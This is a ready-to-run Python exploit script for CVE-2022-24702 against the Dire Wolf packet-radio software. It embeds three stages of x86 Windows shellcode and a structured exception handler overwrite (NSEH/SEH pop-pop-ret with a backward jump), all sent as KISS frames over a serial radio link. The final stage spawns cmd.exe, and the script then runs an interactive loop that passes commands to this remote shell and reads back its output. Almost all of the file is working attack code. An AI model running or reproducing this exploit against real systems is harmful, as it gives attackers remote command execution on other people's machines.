#!/usr/bin/python

# By Rick Osgood
# CVE-2022-24702
# KISS encoding source code modified from https://thomask.sdf.org/code/send_kiss_frame.py

import sys
import socket
import serial
import time

# BADCHARS: \x00\xC0\xDB (KISS protocol control chars)

# Third stage payload
stage3 = "\x81\xc4\xf0\xfe\xff\xff\x89\xe5\x81\xc4\xf0\xfe\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x5c\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x3e\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\xb8\xff\xff\xff\xff\x40\x99\xfc\xac\x53\x88\xc3\x84\xd8\x5b\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf0\x3b\x54\x24\x24\x75\xd7\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\xb8\xa6\x18\x01\x7d\x2d\x01\x01\x01\x01\x50\xff\x55\x04\x89\x45\x10\x68\xd5\xf6\xea\xf0\xff\x55\x04\x89\x45\x14\x68\xd5\xf6\x02\xf1\xff\x55\x04\x89\x45\x18\x68\x80\x8f\x0c\x17\xff\x55\x04\x89\x45\x1c\x68\xfb\x97\xfd\x0f\xff\x55\x04\x89\x45\x20\xb8\xb1\x4a\x2e\xdc\x2d\x01\x01\x01\x01\x50\xff\x55\x04\x89\x45\x24\x68\x16\x65\xfa\x10\xff\x55\x04\x89\x45\x28\x68\x1f\x79\x0a\xe8\xff\x55\x04\x89\x45\x2c\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x30\x68\x54\xca\xaf\x91\xff\x55\x04\x89\x45\x34\x31\xc9\x41\x51\x49\x51\x6a\x0c\x89\x65\x40\x31\xc9\x51\xff\x75\x40\x89\xeb\x83\xc3\x54\x53\x89\xe9\x83\xc1\x50\x51\xff\x55\x1c\x31\xc9\x51\xff\x75\x40\x89\xeb\x83\xc3\x5c\x53\x89\xe9\x83\xc1\x58\x51\xff\x55\x1c\xff\x75\x5c\xff\x75\x5c\xff\x75\x50\x31\xc9\x51\x51\xb0\x80\x31\xc9\x66\xb9\x81\x01\x66\x81\xe9\x01\x01\x01\xc8\x50\x31\xc9\x51\x51\x51\x51\x51\x51\x51\x51\x51\x51\xb1\x44\x51\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x68\x6d\x33\x32\x5c\x68\x79\x73\x74\x65\x68\x77\x73\x5c\x53\x68\x69\x6e\x64\x6f\x68\x43\x3a\x5c\x57\x54\x5b\x83\xc4\xf0\x89\xe0\x83\xc4\xf0\x50\x57\xb8\xff\xff\xff\xff\x40\x50\x50\x50\x40\x50\x48\x50\x50\x50\x53\xff\x55\x30\xff\x75\x5c\xff\x55\x20\xff\x75\x50\xff\x55\x20\x31\xc9\x83\xc1\x40\x51\x66\x81\xc1\xc1\x2f\x49\x51\x66\x81\xe9\x02\x30\x51\x31\xd2\x52\xff\x55\x34\x89\x45\x0c\x31\xc9\x51\x68\x43\x4f\x4d\x30\x89\x65\x08\x8b\x45\x08\x8b\x18\x81\xc3\x01\x01\x01\x02\x81\xeb\x01\x01\x01\x01\x89\x18\x31\xd2\x52\x52\x83\xc2\x03\x52\x83\xea\x03\x52\x52\xba\xff\xff\xff\xbf\x42\x52\xff\x75\x08\xff\x55\x10\x83\xf8\xff\x74\xce\x89\x45\x08\x8d\x5d\x70\x53\x50\xff\x55\x14\x31\xc9\x66\x81\xc1\x80\x25\x83\xc3\x04\x89\x0b\x83\xeb\x04\x53\xff\x75\x08\xff\x55\x18\x31\xc9\x66\x81\xc1\xe8\x03\x51\xff\x55\x24\x31\xc9\x51\x8d\x4d\x60\x51\x31\xc9\x66\x81\xc1\xfd\x03\x51\x8b\x4d\x0c\x83\xc1\x02\x51\xff\x75\x58\xff\x55\x28\x8b\x45\x0c\x31\xc9\x88\x48\x01\x66\x81\xc1\xc1\x01\x66\x81\xe9\x01\x01\x88\x08\x8b\x5d\x60\x83\xc3\x02\x01\xd8\x88\x08\x31\xc9\x51\x89\xeb\x83\xc3\x64\x53\x8b\x5d\x60\x83\xc3\x03\x53\xff\x75\x0c\xff\x75\x08\xff\x55\x2c\x31\xf6\x31\xc9\x89\xcb\x31\xc9\x51\x8d\x4d\x60\x51\x6a\x01\x8b\x45\x0c\x01\xd8\x50\xff\x75\x08\xff\x55\x28\x83\x7d\x60\x01\x75\xe5\xb1\xc1\x49\x8b\x45\x0c\x01\xd8\x43\x3a\x08\x74\x02\xeb\xd6\x46\x83\xfe\x02\x75\xd0\x8b\x4d\x0c\x01\xd9\x49\xc6\x01\x0d\xc6\x41\x01\x0a\x31\xd2\x88\x51\x02\x31\xc9\x51\x89\xe9\x83\xc1\x64\x51\x4b\x53\x8b\x4d\x0c\x83\xc1\x02\x51\xff\x75\x54\xff\x55\x2c\xe9\x3d\xff\xff\xff"

# Second stage payload
stage2 =  "\x81\xc4\xf0\xfe\xff\xff\xc7\x44\x24\x10\xff\xff\xff\xff\xc7\x44\x24\x14\xff\xff\xff\xff\xc7\x44\x24\x18\xff\xff\xff\xff\xc7\x44\x24\x1c\xff\xff\xff\xff\xc7\x44\x24\x2c\xff\xff\xff\xff\xc7\x44\x24\x24\xff\xff\xff\xff\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x51\x68\x43\x4f\x4d\x30\x89\x65\x44\x8b\x4d\x44\x83\xc1\x03\x8a\x19\xfe\xc3\x88\x19\x31\xd2\x52\x52\x83\xc2\x03\x52\x83\xea\x03\x52\x52\xba\xff\xff\xff\xbf\x42\x52\xff\x75\x44\xff\x55\x10\x83\xf8\xff\x74\xd5\x89\x45\x44\x8d\x5c\x24\x28\x53\x50\xff\x55\x18\x31\xc9\x66\x81\xc1\x80\x25\x83\xc3\x04\x89\x0b\x83\xeb\x04\x53\xff\x75\x44\xff\x55\x1c\x31\xf6\x31\xc9\x89\xcb\x31\xc9\x51\x8d\x4d\x34\x51\x6a\x01\x8b\x45\x24\x01\xd8\x50\xff\x75\x44\xff\x55\x14\x83\x7d\x34\x01\x75\xe5\xb1\xc1\x49\x8b\x45\x24\x01\xd8\x43\x3a\x08\x74\x02\xeb\xd6\x46\x83\xfe\x02\x75\xd0\xff\x75\x44\xff\x55\x2c\x8b\x4d\x24\x83\xc1\x12\xff\xe1"

# First stage payload
stage1 = "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x89\xe0\x8b\x1d\xd0\x56\x88\x7c\x83\xc3\x24\x89\xdc\x31\xc9\x51\x68\x22\x02\xfb\x7f\x51\x68\x1e\x02\xfb\x7f\x51\xba\x1d\x01\xfb\x7f\x66\x81\xea\x01\x01\x52\x66\x83\xea\x1a\x52\x51\x89\xc4\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x5c\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x3e\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\xb8\xff\xff\xff\xff\x40\x99\xfc\xac\x53\x88\xc3\x84\xd8\x5b\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf0\x3b\x54\x24\x24\x75\xd7\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\xb8\xc1\x97\xe2\xef\x48\x50\xff\x55\x04\x89\x45\x14\x68\x9c\x95\x1a\x6e\xff\x55\x04\x89\x45\x18\x68\xa1\x6a\x3d\xd8\xff\x55\x04\x89\x45\x1c\x68\xdd\x9c\xbd\x72\xff\x55\x04\x89\x45\x20\x68\xed\xdf\x54\xe4\xff\x55\x04\x89\x45\x24\x68\xa7\xba\x49\x32\xff\x55\x04\x89\x45\x28\x68\x4a\x65\x76\x47\xff\x55\x04\x89\x45\x2c\x68\xfb\x97\xfd\x0f\xff\x55\x04\x8b\x1d\x18\xf1\x5d\x01\x53\xff\xd0\x31\xc9\x51\x83\xc1\x02\x51\xff\x55\x24\x89\x45\x34\x8d\x5d\x40\x31\xc9\x66\x81\xc1\x30\x01\x89\x4d\x40\x53\x50\xff\x55\x28\x68\x2e\x65\x78\x65\x68\x6f\x72\x65\x72\x68\x65\x78\x70\x6c\x89\xe7\x8d\x5d\x40\x53\x8b\x45\x34\x50\xff\x55\x2c\x31\xc9\xba\x01\x2c\xcb\xbb\xc1\xea\x08\x8b\x34\x8a\x3b\x34\x8f\x75\xe3\x41\x83\xf9\x03\x75\xea\x8b\x4b\x08\x51\x31\xd2\x52\xb8\x01\xff\x0f\x1f\xc1\xe8\x08\x50\x89\x4d\x3c\xff\x55\x14\x89\x45\x30\x31\xc9\x83\xc1\x40\x51\x66\x81\xc1\xc1\x2f\x49\x51\x51\x31\xd2\x52\x50\xff\x55\x18\x89\x45\x0c\x8d\x4d\x08\x51\x31\xc9\x66\x81\xc1\xff\x0f\x51\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x67\x56\x50\x8b\x5d\x30\x53\xbb\x01\x70\x05\x76\xc1\xeb\x08\x8b\x0b\x89\x4e\x0a\x83\xc3\x10\x8b\x0b\x89\x4e\x12\xbb\x01\x08\x06\x76\xc1\xeb\x08\x8b\x0b\x89\x4e\x1a\x83\xc3\x04\x8b\x0b\x89\x4e\x22\xbb\x01\x74\x05\x76\xc1\xeb\x08\x8b\x0b\x89\x4e\x2a\x89\xc3\x66\x81\xc3\x10\x10\x89\x5e\x32\xff\x55\x1c\x31\xd2\x52\x52\x52\x8b\x45\x0c\x50\x52\x52\x8b\x45\x30\x50\xff\x55\x20\x31\xc9\x51\x6a\xff\xff\x55\x10"

# Other payload data
NSEH = "\x90\x90\xeb\x04"
SEH = "\x30\x02\xfc\x7f"        # POP, POP, RET
JMP = "\xe9\xe5\xfc\xff\xff"    # JMP backward to the beginning of payload for more space
payload = stage1
payload += stage2
payload += "A" * (782 - len(stage1) - len(stage2))
payload += NSEH
payload += SEH
payload += JMP
payload += "C" * (200 - len(JMP))

KISS_FEND = 0xC0    # Frame start/end marker
KISS_FESC = 0xDB    # Escape character
KISS_TFEND = 0xDC   # If after an escape, means there was an 0xC0 in the source message
KISS_TFESC = 0xDD   # If after an escape, means there was an 0xDB in the source message

if len(sys.argv) != 3:
    print("Usage: %s <source callsign> <destination callsign>" % sys.argv[0])
    sys.exit(1)

# Addresses must be 6 bytes plus the SSID byte, each character shifted left by 1
# If it's the final address in the header, set the low bit to 1
# Ignoring command/response for simple example
def encode_address(s, final):
    if "-" not in s:
        s = s + "-0"    # default to SSID 0
    call, ssid = s.split('-')
    if len(call) < 6:
        call = call + " "*(6 - len(call)) # pad with spaces
    encoded_call = [ord(x) << 1 for x in call[0:6]]
    encoded_ssid = (int(ssid) << 1) | 0b01100000 | (0b00000001 if final else 0)
    return encoded_call + [encoded_ssid]

# Make a UI frame by concatenating the parts together
# This is just an array of ints representing bytes at this point
dest_addr = encode_address(sys.argv[2].upper(), False)
src_addr = encode_address(sys.argv[1].upper(), True)
c_byte = [0x03]           # This is a UI frame
pid = [0xF0]              # No protocol
msg = [ord(c) for c in payload]

packet = dest_addr + src_addr + c_byte + pid + msg

# Escape the packet in case either KISS_FEND or KISS_FESC ended up in our stream
packet_escaped = []
for x in packet:
        if x == KISS_FEND:
            packet_escaped += [KISS_FESC, KISS_TFEND]
        elif x == KISS_FESC:
            packet_escaped += [KISS_FESC, KISS_TFESC]
        else:
            packet_escaped += [x]

# Build the frame that we will send to Dire Wolf and turn it into a string
kiss_cmd = 0x00 # Two nybbles combined - TNC 0, command 0 (send data)
kiss_frame = [KISS_FEND, kiss_cmd] + packet_escaped + [KISS_FEND]
output = bytearray(kiss_frame)

#print(output) # For debugging

print("[+] Total stage1 and stage2 size: " + str(len(stage1) + len(stage2)))
if (len(stage1) + len(stage2)) > 782:
        print("[!] ERROR: Total size is >782 bytes!!!")
        exit(1)

# Send stage 1 and stage 2
ser = serial.Serial('/dev/ttyAMA0', 19200)
print("[+] Sending exploit packet...")
ser.write(output)
print("[+] Stage 1 and 2 sent!")


# Send stage 3
msg = [ord(c) for c in stage3]
packet = dest_addr + src_addr + c_byte + pid + msg

# Escape the packet in case either KISS_FEND or KISS_FESC ended up in our stream
packet_escaped = []
for x in packet:
        if x == KISS_FEND:
            packet_escaped += [KISS_FESC, KISS_TFEND]
        elif x == KISS_FESC:
            packet_escaped += [KISS_FESC, KISS_TFESC]
        else:
            packet_escaped += [x]

# Build the frame that we will send to Dire Wolf and turn it into a string
kiss_cmd = 0x00 # Two nybbles combined - TNC 0, command 0 (send data)
kiss_frame = [KISS_FEND, kiss_cmd] + packet_escaped + [KISS_FEND]
output = bytearray(kiss_frame)

input("[+] Press enter to send second packet")
ser.write(output)
print("[+] Stage 3 sent!")

payload = b""
data = b""

print("[+] Waiting for reverse shell...")
print("")


while True:
        cCount = 0
        data = b''
        b = b''
        # Read data from reverse shell
        while cCount < 2:
                b = ser.read(size=1)
                if b == b"\xc0":
                        cCount = cCount + 1
                else:
                        if b != '\x00':
                                data += b

        data = data[1:]
        data = "".join( chr(x) for x in data)

        # Get command from user
        cmd = bytes(input(data), "ascii")

        packet_escaped = []
        for x in cmd:
                packet_escaped += [x]


        # Build the frame that we will send to Dire Wolf and turn it into a string
        kiss_cmd = 0x00 # Two nybbles combined - TNC 0, command 0 (send data)
        kiss_frame = [KISS_FEND, kiss_cmd] + packet_escaped + [KISS_FEND]
        #kiss_frame = [KISS_FEND, kiss_cmd] + cmd + [KISS_FEND]
        output = bytearray(kiss_frame)

        # Send cmd
        ser.write(output)